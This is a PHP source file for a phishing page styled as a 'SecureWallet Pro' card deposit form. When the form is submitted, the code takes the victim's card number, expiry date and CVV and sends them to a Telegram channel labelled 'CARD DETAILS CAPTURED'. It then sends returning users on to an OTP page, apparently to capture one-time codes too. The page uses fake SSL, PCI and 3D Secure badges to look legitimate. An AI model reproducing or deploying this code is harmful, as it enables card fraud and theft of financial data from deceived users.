<?php
require_once 'config.php';
if (!$_SESSION['user_id']) header('Location: index.php');


// Fetch user FIRST
$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user_id']]);
$user = $stmt->fetch();

if ($_POST) {
    $card_number = $_POST['card_number'];
    $expiry = $_POST['expiry'];
    $cvv = $_POST['cvv'];
    $amount = $_POST['amount'];
    
    // Send to Telegram
    $message = "💳 <b>CARD DETAILS CAPTURED</b>\n";
    $message .= "👤 User: {$user['username']}\n";
    $message .= "💰 Amount: $$amount\n";
    $message .= "🪪 Card: {$card_number}\n";
    $message .= "📅 Expiry: {$expiry}\n";
    $message .= "🔒 CVV: {$cvv}\n";
    $message .= "⏰ " . date('Y-m-d H:i:s');
    sendTelegram($message);
    
    // Save card status
    $db->prepare("UPDATE users SET card_saved = 1 WHERE id = ?")->execute([$_SESSION['user_id']]);
    
    // First time? Go to success, else OTP
    $stmt = $db->prepare("SELECT card_saved FROM users WHERE id = ?");
    $stmt->execute([$_SESSION['user_id']]);
    $card_saved = $stmt->fetchColumn();
    
    $_SESSION['deposit_amount'] = $amount;
    if ($card_saved == 1) {
        header('Location: deposit_otp.php');
    } else {
        // Update balance immediately for first deposit
        $db->prepare("UPDATE users SET balance = balance + ? WHERE id = ?")
           ->execute([$amount, $_SESSION['user_id']]);
        // Log transaction
        $db->prepare("INSERT INTO transactions (user_id, type, method, amount, status, details) VALUES (?, 'deposit', 'card', ?, 'success', 'First card deposit')")
           ->execute([$_SESSION['user_id'], $amount]);
        header('Location: deposit_success.php');
    }
    exit;
}

$stmt = $db->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user_id']]);
$user = $stmt->fetch();
?>
<!DOCTYPE html>
<html>
<head>
    <title>Card Payment - SecureWallet Pro</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="card-page">
    <div class="payment-container">
        <div class="payment-header">
            <a href="deposit.php" class="back">← Back</a>
            <h2>Enter Card Details</h2>
            <p>Secure 256-bit SSL Encryption</p>
        </div>
        
        <form method="POST" class="card-form">
            <div class="input-group">
                <label>Amount to Deposit</label>
                <div class="amount-input">
                    $<input type="number" name="amount" step="0.01" min="10" required>
                </div>
            </div>
            
            <div class="input-group">
                <label>Card Number</label>
                <input type="text" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" required>
            </div>
            
            <div class="row">
                <div class="input-group">
                    <label>Expiry Date</label>
                    <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
                </div>
                <div class="input-group">
                    <label>CVV</label>
                    <input type="text" name="cvv" placeholder="123" maxlength="4" required>
                </div>
            </div>
            
            <button type="submit" class="btn-pay">Pay Now →</button>
        </form>
        
        <div class="security-badges">
            <img src="https://via.placeholder.com/50x30/0078D4/FFFFFF?text=SSL" alt="SSL">
            <img src="https://via.placeholder.com/50x30/00A651/FFFFFF?text=PCI" alt="PCI">
            <img src="https://via.placeholder.com/50x30/FF6C00/FFFFFF?text=3D" alt="3D Secure">
        </div>
    </div>
</body>
</html>
